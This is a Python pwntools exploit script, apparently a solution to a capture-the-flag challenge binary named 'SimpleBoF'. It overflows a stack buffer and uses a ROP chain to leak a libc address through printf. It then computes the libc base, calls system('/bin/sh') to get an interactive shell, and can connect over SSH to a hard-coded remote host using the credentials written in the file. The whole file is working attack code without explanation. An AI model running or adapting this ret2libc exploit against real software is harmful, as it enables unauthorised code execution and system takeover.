from pwn import *


printf_plt=0x400450

# find rop gadget
pop_rdi=0x400623
gets_got=0x601030
gets_off=0x06ed80

mainn=0x40057d

#compute offset (ssh)
off_system=0x45390 
str_binsh=0x18cd17



def main():
	if len(args)<2:
		#r=remote("127.0.0.1",9999)
		r=process('./SimpleBoF')
	else:
		s=ssh(host="103.237.99.35",user="pwn001",password="Pwn001")
		r=s.process("./SimpleBoF")


	#leak libc

	pl="A"*40 

	pl+=p64(pop_rdi)
	pl+=p64(gets_got)
	pl+=p64(printf_plt)
	pl+=p64(mainn) # return main after leak printf

	#f=open('x','w')
	#f.write(pl)
	#f.close()

	r.sendline(pl)
	leak=r.recv(1024)
	r.sendline(pl)
	leak2=r.recv(1024)[:6].encode('hex')
	leak2="0x"+leak2+"0000"
	print leak2
	libc_gets=p64(eval(leak2)).encode('hex')
	log.info("Leak printf: " + (libc_gets))


	libcbase=eval('0x'+libc_gets)-gets_off
	system=libcbase+off_system
	binsh=libcbase+str_binsh


	log.info("libcbase: " + hex(libcbase))
	log.info("system: " + hex(system))
	log.info("binsh: " + hex(binsh))

	raw_input("Exploit?")

	#exploit !
	pl="A"*40
	pl+=p64(pop_rdi)
	pl+=p64(binsh)
	pl+=p64(system)
	r.sendline(pl)
	r.sendline('id')
	r.interactive()

if __name__=="__main__":
	main()
	sys.exit(0)
